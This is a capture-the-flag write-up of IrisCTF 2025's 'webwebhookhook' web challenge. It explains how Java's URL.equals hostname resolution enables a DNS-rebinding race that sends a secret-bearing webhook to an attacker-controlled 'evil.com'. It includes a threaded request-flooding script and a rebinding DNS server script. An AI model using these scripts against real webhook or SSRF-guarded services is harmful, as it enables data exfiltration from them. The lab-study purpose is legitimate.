---
title: "webwebhookhook - IrisCTF 2025"
category: "web"
subcategory: "race"
type: "writeup"
tags: ["web", "race-condition", "dns-rebinding", "webwebhookhook", "race", "irisctf", "irisctf-2025", "2025", "ctf-writeup"]
summary: "![Zimzi's avatar](https://substack.com/@zimzi)"
source:
  name: "CTFtime writeup #39760"
  url: "https://ctftime.org/writeup/39760"
original_source: "https://zimzi.substack.com/p/irisctf-2025-webwebhookhook"
ctf:
  name: "IrisCTF 2025"
  year: 2025
  challenge: "webwebhookhook"
---

## Metadata

- **CTF:** IrisCTF 2025
- **Task:** webwebhookhook
- **Author team:** Gimel
- **CTFtime:** <https://ctftime.org/writeup/39760>
- **Original writeup:** <https://zimzi.substack.com/p/irisctf-2025-webwebhookhook>

---
# IrisCTF 2025: webwebhookhook 

### DNS rebinding

[![Zimzi's avatar](https://substackcdn.com/image/fetch/$s_!7J0a!,w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba6ea3a0-f2af-45ce-9f5d-82bf420f4890_1024x1024.png)](https://substack.com/@zimzi)

[Zimzi](https://substack.com/@zimzi)

Jan 10, 2025

Share

[![](https://substackcdn.com/image/fetch/$s_!3x--!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3be04b60-612e-4842-ab4e-63726de5de0d_1295x344.png)](https://substackcdn.com/image/fetch/$s_!3x--!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3be04b60-612e-4842-ab4e-63726de5de0d_1295x344.png)

Author: sera

Links with source code: [ctf-webpage](https://2025.irisc.tf/challenges?category=Web+Exploitation) or [IrisCTF GitHub ](https://github.com/IrisSec/IrisCTF-2025-Challenges/tree/main/webwebhookhook)

# Overview

The app that allows:

  1. registering new hooks with their template and responses:

_fragment of MainController.kt_
[code]@PostMapping("**/create** ", consumes = [MediaType.APPLICATION_JSON_VALUE])
             @ResponseBody
             fun create(@RequestBody body: StateType): String {
                 for(h in State.arr) {
                     if(body.hook == h.hook)
                         return "{\"result\": \"fail\"}"
                 }
                 State.arr.add(body)
                 return "{\"result\": \"ok\"}"
           }
```

_fragment of State.kt that implements a structure to store a hook:_
[code]class **StateType**(
                 hook: String,
                 var template: String,
                 var response: String
                 ) {
             var hook: URL = URI.create(hook).toURL()
         }
```

  2. forwards incoming requests to a stored hook (substituting the request body into a saved template) if it exists:

_fragment of MainController.kt_
[code]@PostMapping("**/webhook"**)
             @ResponseBody
             fun webhook(@RequestParam("hook") hook_str: String, @RequestBody body: String, @RequestHeader("Content-Type") contentType: String, model: Model): String {
                 var hook = URI.create(hook_str).toURL();
                 for (h in State.arr) {
                     if(h.hook == hook) {
                         var newBody = h.template.replace("_DATA_", body);
                         var conn = hook.openConnection() as? HttpURLConnection;
                         if(conn === null) break;
                         conn.requestMethod = "POST";
                         conn.doOutput = true;
                         conn.setFixedLengthStreamingMode(newBody.length);
                         conn.setRequestProperty("Content-Type", contentType);
                         conn.connect()
                         conn.outputStream.use { os ->
                             os.write(newBody.toByteArray())
                         }
         
                         return h.response
                     }
                 }
                 return "{\"result\": \"fail\"}"
         }
```


A flag is returned for hook `http://example.com/admin`. However, it seems not useful for us to just send the flag to `example.com`. Right?

```
    const val **FLAG** = "irisctf{test_flag}";
    
    fun main(args: Array<String>) {
        State.arr.add(StateType(
                "http://example.com/admin",
                "{\"data\": _DATA_, \"flag\": \"" + FLAG + "\"}",
                "{\"response\": \"ok\"}"))
        runApplication<WebwebhookhookApplication>(*args)
    }
```

Let's check if we can pretend to be `example.com`.

# Java quirky behaviour and DNS biding

First I thought, maybe something goes wrong when comparing two URIs like we do in the `/webhook` endpoint?

```
      var hook = URI.create(hook_str).toURL();
            for (h in State.arr) {
                if(h.hook == hook) {...
```

Then I looked at the documentation. And I made a surprising discovery – two URLs are considered equal if their domain resolves to the same IP. If we could make a DNS server to resolve a domain like `example.com` to our IP, we would be able to get the flag.

```
    **public boolean equals​(Object obj)**
    Compare this URL for equality with another object.
    If the given object is not a URL then this method immediately returns false.
    
    Two URL objects are equal if they have the same protocol, reference equivalent hosts, have the same port number on the host, and the same file and fragment of the file.
    
    Two hosts are considered equivalent if **both host names can be resolved into the** **same IP addresses** ; else if either host name can't be resolved, the host names must be equal without regard to case; or both host names equal to null.
    
    Since hosts comparison requires name resolution, this operation is a blocking operation.
    
    Note: The defined behavior for equals is known to be inconsistent with virtual hosting in HTTP.
    
    [Source](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/net/URL.html#equals\(java.lang.Object\))
```

Text within this block will maintain its original spacing when published
```

```
* * *

Text within this block will maintain its original spacing when published

```
    👶 A **DNS server** is a server on that helps domain names like www.example.com into IP addresses (93.184.216.34).
```

* * *

Let's look at the fragments of code `MainCotroller.kt /webhook':

```
    (if(h.hook == hook) {...}
```

If we request `IRIS_URL?webhook=http://evil.com/admin?hook=xoxo` and we configure the DNS server of `evil.com` to resolve it to `example.com` IP's - 93.184.216.3 - we can pass the above check, despite the fact that domains differ.

Next the code connects to the `hook` URL:

```
    var conn = hook.openConnection() as? HttpURLConnection;
```

What's worth noticing, the code doesn't connect to the `h.hook` returned from hooks array, but a `hook` provided by the user in the URL.

The DNS server still resolves `evil.com` to IP 93.184.216.34, but we still don't get a flag, as we don't control `example.com`' s IP. We wish that this time it would return the IP of `evil.com` domain.

To make this attack possible we need:

  1. in hooks comparison return the example.com IP : `if(h.hook == hook) {...}`

  2. some code execute in between

  3. in connection request returns the `evil.com` IP: `hook.openConnection()`


The task author made this timing attack a bit easier by adding the line:

```
    var newBody = h.template.replace("_DATA_", body);
```

`_DATA_` is replaced by the body provided by the user in `/webhook` request. If we provide a long body, we will have more time to switch to a different IP.

* * *

Text within this block will maintain its original spacing when published

```
    👧 The task is associated with **DNS rebinding attack.**
    
    DNS rebinding attack is an exploit that manipulates domain name resolution to bypass the same-origin policy in web browsers. By changing the IP address for a trusted domain on the fly, an attacker tricks the browser into letting malicious scripts connect to otherwise restricted resources. This effectively turns a user’s browser into a gateway for unauthorized data access or manipulation.
```

* * *

# Implementation details

Let's implement request sending to `/webhook` endpoint. We send requests in concurrent threads to make the race condition more likely. The aim of this is to overload the server with requests.

```
    import requests
    
    url = "https://webwebhookhook-xxx.i.chal.irisc.tf/"
    
    s = requests.Session()
    def webhook(mynewurl):
        global url 
        try:
            s.post(url+'webhook', params={'hook': mynewurl}, data= ("a_"*100000).encode('utf-8'))
    
        except requests.exceptions.HTTPError as http_err:
            print(http_err)
            
    import random
    def xoxo():
        while True:
            webhook("http://evil.com/admin")
    
    import threading
    for i in range(50):
        threading.Thread(target=xoxo).start()
```

The second part requires preparing a DNS server that randomly answers with IP addresses of `example.com` and `evil.com`. 

We also set this DNS server for our evil domain on a domain provided webpage.

_The code is fully written by ChatGPT._

```
    #!/usr/bin/env python3
    import socket, random ,time
    from dnslib import DNSRecord, QTYPE, RR, A, DNSHeader
    
    # Two IP addresses you want to respond with:
    IP_ADDRESSES = ["93.184.215.14", "6.6.6.X"]
    
    def main():
        # Create a UDP socket and bind to port 53 (DNS)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("0.0.0.0", 53))
    
        print("DNS server listening on port 53...")
    
        # Round-robin index for cycling through IP_ADDRESSES
        ip_index = 0
    
        order = [0,1]
        while True:
            # Receive up to 512 bytes of data from a client
            data, addr = sock.recvfrom(512)
            
            try:
                # Parse the incoming DNS request
                request = DNSRecord.parse(data)
                
                # Extract question name/type from the request
                qname = request.q.qname
                qtype = QTYPE[request.q.qtype]
                
                # Log the request
                print(time.time(), f"Received query for {qname} (type: {qtype}) from {addr}")
                
                # Prepare DNS response (echo back the ID from the request)
                response = DNSRecord(
                    DNSHeader(
                        id=request.header.id, 
                        qr=1,      # Response flag
                        aa=1,      # Authoritative Answer
                        ra=1       # Recursion Available
                    ),
                    q=request.q
                )
    
                # If the query type is A, respond with one of our two IPs
                if qtype == "A":
                    order.reverse()
                    
                    for ip_index in order:
                        response.add_answer(RR(
                            rname=qname,
                            rtype=QTYPE.A,
                            rclass=1,
                            ttl=5,
                            rdata=A(IP_ADDRESSES[ip_index])
                        ))
    
                    # Cycle through IP_ADDRESSES in a round-robin fashion
                    ip_index = (ip_index + 1) % len(IP_ADDRESSES)
    
                # Send the DNS response back to the client
                sock.sendto(response.pack(), addr)
            
            except Exception as e:
                print(f"Error parsing or responding to DNS query: {e}")
    
    if __name__ == "__main__":
        main()
```

What is helpful in our case is a short TTL (Time To Live), it determines how long a DNS record is considered valid once it’s been fetched. So if we specify a short TTL the server will make frequent lookups to our DNS server to return a current IP for a given domain. What we are trying to achieve is to capture the moment when the IP switches from `example.com` to `evil.com` during the replacement.

In practise, it seemed we were able to lower the time between requests to about only 30s. Perhaps the Java DNS client has a limit on how much we can lower this value.

Then we run both script and wait for the flag:

**irisctf{url_equals_rebind}**

Happy hacking! Bye bye!

# Reading recommendations

I also highly recommend reading other writeups by [Gimel](https://www.gimel.sh/):

  * [Crispy Kelp](https://github.com/gimel-team/ctf-writeups/tree/master/2025/iris-ctf/crispy-kelp) (RE) by m4tx

  * [Now This Will Run on My](https://github.com/gimel-team/ctf-writeups/tree/master/2025/iris-ctf/now-this-will-run-on-my-486) (RE) by m4tx

  * [No shark?](https://github.com/gimel-team/ctf-writeups/tree/master/2025/iris-ctf/no-shark) (Networks) by seqre


We also played hxp38C3 CTF. You may be interested in reading these writeups:

  * [hxp 38C3 CTF: Fajny Jagazyn Wartości Kluczy](https://hxp.io/blog/114/hxp-38C3-CTF-Fajny-Jagazyn-Wartoci-Kluczy/)

  * [hxp 38C3 CTF: phpnotes](https://hxp.io/blog/113/hxp-38C3-CTF-phpnotes/)


Great Twitter account to be up-to-date with XSS:

  * [Terjanq](https://x.com/terjanq)


Thanks for reading Zimzi’s Substack! Subscribe for free to receive new posts and support my work.

Share
